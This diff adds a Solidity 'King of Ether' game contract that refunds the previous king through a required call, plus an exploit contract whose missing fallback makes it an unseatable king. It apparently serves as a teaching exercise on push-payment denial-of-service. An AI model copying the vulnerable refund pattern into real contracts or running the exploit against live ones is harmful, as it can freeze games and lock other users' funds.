@@ -1,0 +1,39 @@
+//Deposit more than previous user to become the king.
+
+
+contract KingOfEth {
+    address payable public king;
+
+    function play() external payable {
+        // previous balance = current balance - ETH sent
+        uint bal = address(this).balance - msg.value;
+        require(msg.value > bal, "need to pay more to become the king");
+
+        (bool sent, ) = king.call{value: bal}("");
+        require(sent, "failed to send ETH");
+
+        king = payable(msg.sender);
+    }
+}
+
+--------------------------------------------------------------------------
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+interface IKingOfEth {
+    function play() external payable;
+}
+
+contract KingOfEthExploit {
+    IKingOfEth public target;
+
+    constructor(IKingOfEth _target) {
+        target = _target;
+    }
+
+    // no fallback to accept ETH
+
+    function pwn() external payable {
+        target.play{value: msg.value}();
+    }
+}
